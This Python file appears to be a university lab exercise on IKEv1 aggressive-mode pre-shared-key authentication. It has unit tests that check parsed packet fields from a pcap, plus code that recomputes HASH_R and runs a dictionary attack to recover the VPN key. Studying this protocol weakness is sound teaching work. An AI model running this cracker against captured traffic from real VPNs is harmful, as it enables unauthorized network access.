#pcapPath = "../pcaps/ikev1-psk-aggressive-mode.pcapng"
#dictPath = "../dict/list.txt"

pcapPath = "../pcaps/ikev1-psk-aggressive-mode.pcapng"
dictPath = "../dict/list.txt"

from scapy.all import *
import unittest
import ikev1_pcapReader as pcapReader
import ikev1_payloadParser as ikeParser
import hmac
from hashlib import *
import binascii

class TestStringMethods(unittest.TestCase):
    initSAPacketHash = 'd2e89614bf3b3db2bfa49ac0f2c3886afd334ba4dfb8d83ac7ce2845fb4b8fbc'
    respSAPacketHash = '26c0c9006369b2c3d63a2e321769a3a17a618bd87685c4b424185ffae522c8af'
    hashTargetHash = 'd4a0b1eafc0b9ba6decef27d74bad0e21e1cccec6a33f7513d457c110a0bf475'
    SAPayloadHash = '9cf3d227565c5aec2151e0dfecc2f221cb92028e7ae8983a8cf58e51d9f0b7de'
    respIDHash = '075e0f92cd8e90e614da058b57c22c2273e85666be099dde25b9475e778589e0'
    initCookieHash = 'e4cdb411ef22aa8f4cf247838099d3fc1a53cef3764f5b5d9d89d8ca8d60be3f'
    respCookieHash = '728dfa161440cc68436f55baf6b0b5b16ab04dcce47ea931967db2ef15004b8e'
    initKEXHash = 'bab450b4af06d5ee0c6aa50a578a9d2242b72665e3ec5f196bc03cbee6c0b975'
    respKEXHash = 'd99432634866fcef67ded4dc1a1813266cb3c4db8361289e31ae77bd7025574b'
    initNonceHash = '89ba1e13475c116710c1258f7f57c4712d582e44406f4eb4172bf0581ac96af0'
    respNonceHash = '75626d88df06e1661c7732aa3359aba27fb27eb9c3d34ca6bfd94721a935225e'


    def test_initSAPacket(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
        initHash = sha256(raw(initSAPacket)).hexdigest()
        self.assertEqual(initHash, TestStringMethods.initSAPacketHash)

    def test_respSAPacketHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        respSAPacketHash = sha256(raw(respSAPacket)).hexdigest()
        self.assertEqual(respSAPacketHash, TestStringMethods.respSAPacketHash)

    def test_targetHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        targetHash = ikeParser.getRespHashfromPacket(respSAPacket)
        hashTargetHash = sha256(targetHash).hexdigest()
        self.assertEqual(hashTargetHash, TestStringMethods.hashTargetHash)

    def test_SAPayloadHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
        SAPayload = ikeParser.getSAPayloadFromInitPacket(initSAPacket)
        SAPayloadHash = sha256(SAPayload).hexdigest()
        self.assertEqual(SAPayloadHash, TestStringMethods.SAPayloadHash)

    def test_respIDHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        respID = ikeParser.getResponderIDFromRespPacket(respSAPacket)
        respIDHash = sha256(respID).hexdigest()
        self.assertEqual(respIDHash, TestStringMethods.respIDHash)


    def test_initCookieHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
        initCookie = ikeParser.getCookieFromISAKMP(initSAPacket,False)
        initCookieHash = sha256(initCookie).hexdigest()
        self.assertEqual(initCookieHash, TestStringMethods.initCookieHash)


    def test_respCookieHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        respCookie = ikeParser.getCookieFromISAKMP(respSAPacket, True)
        respCookieHash = sha256(respCookie).hexdigest()
        self.assertEqual(respCookieHash, TestStringMethods.respCookieHash)

    def test_initKEXHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
        initKEX = ikeParser.getPayloadFromISAKMP(initSAPacket,ikeParser.ISAKMP_KEX_NAME)
        initKEXHash  = sha256(initKEX).hexdigest()
        self.assertEqual(initKEXHash, TestStringMethods.initKEXHash)

    def test_respKEXHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        respKEX = ikeParser.getPayloadFromISAKMP(respSAPacket,ikeParser.ISAKMP_KEX_NAME)
        respKEXHash  = sha256(respKEX).hexdigest()
        self.assertEqual(respKEXHash, TestStringMethods.respKEXHash)
        
    def test_initNonceHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
        initNONCE = ikeParser.getPayloadFromISAKMP(initSAPacket,ikeParser.ISAKMP_NONCE_NAME)
        initNonceHash  = sha256(initNONCE).hexdigest()
        self.assertEqual(initNonceHash, TestStringMethods.initNonceHash)
        
    def test_respNonceHash(self):
        netPackets = pcapReader.openPCAPFile(pcapPath)
        ikePackets = pcapReader.getISAKMPPackets(netPackets)
        respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        respNONCE = ikeParser.getPayloadFromISAKMP(respSAPacket,ikeParser.ISAKMP_NONCE_NAME)
        respNonceHash  = sha256(respNONCE).hexdigest()
        self.assertEqual(respNonceHash, TestStringMethods.respNonceHash)


###########################################################
# Implement your code here DO NOT touch functions above   #
###########################################################

def bytesToHex(byteStr):
    return binascii.hexlify(bytes(byteStr, "ascii"))

def computeKeyFromValues(initNONCE, respNONCE, psk):
    # k := PRF_psk(n_i, n_r) mit HMAC als PRF und psk als key
    return hmac.new(bytes(psk, "ascii"), initNONCE + respNONCE, sha1)

def computeHashRFromValues(psk, packets):
    # Initator- und Responder-Pakete
    initSAPacket = ikeParser.getIniatorSAPacket(packets)
    respSAPacket = ikeParser.getResponderSAPacket(packets)
    # g^x
    initKEX = ikeParser.getPayloadFromISAKMP(initSAPacket, ikeParser.ISAKMP_KEX_NAME)
    # g^y
    respKEX = ikeParser.getPayloadFromISAKMP(respSAPacket, ikeParser.ISAKMP_KEX_NAME)
    # cyk_I
    initCookie = ikeParser.getCookieFromISAKMP(initSAPacket, False)
    # cyk_R
    respCookie = ikeParser.getCookieFromISAKMP(respSAPacket, True)
    # SA_I
    SAPayload = ikeParser.getSAPayloadFromInitPacket(initSAPacket)
    # ID_R
    respID = ikeParser.getResponderIDFromRespPacket(respSAPacket)
    # n_I
    initNONCE = ikeParser.getPayloadFromISAKMP(initSAPacket, ikeParser.ISAKMP_NONCE_NAME)
    # n_R
    respNONCE = ikeParser.getPayloadFromISAKMP(respSAPacket, ikeParser.ISAKMP_NONCE_NAME)
    # PRF_k(g^y,g^x,cyk_R,cyk_I,SA_I,ID_R)
    return hmac.new(computeKeyFromValues(initNONCE, respNONCE, psk).digest(), respKEX + initKEX + respCookie + initCookie + SAPayload + respID, sha1)

if __name__ == '__main__':
    # Pakete vorbereiten
    netPackets = pcapReader.openPCAPFile(pcapPath)
    ikePackets = pcapReader.getISAKMPPackets(netPackets)
    initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
    respSAPacket = ikeParser.getResponderSAPacket(ikePackets)

    # Wörterbuch in den Speicher laden
    dictionary = []
    with open(dictPath, 'r') as file:
        dictionary = file.read().splitlines()

    # Brute-Force Schlüsselsuche
    for word in dictionary:
        if computeHashRFromValues(word,ikePackets).hexdigest() == binascii.hexlify(ikeParser.getRespHashfromPacket(respSAPacket)).decode():
            print("Passwort gefunden: " + word)
            exit()
    unittest.main()
